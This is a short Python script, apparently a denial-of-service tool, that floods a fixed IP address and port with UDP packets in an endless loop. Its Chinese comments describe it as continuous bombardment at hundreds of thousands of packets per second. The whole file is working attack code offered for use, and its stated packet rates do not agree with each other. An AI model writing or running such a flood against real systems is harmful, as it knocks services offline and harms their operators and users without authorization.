# flood.py  — 每秒 30 萬包，持續轟炸
import socket, time
TARGET = ("192.168.68.89", 8080)
NPKT   = 300_000            # 每回合封包數
INTERVAL = 0.2              # 0.2 秒發一輪 ≈ 1.5 Mpps

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    for _ in range(NPKT):
        sock.sendto(b"x", TARGET)
    print("sent", NPKT, "packets")
    time.sleep(INTERVAL)
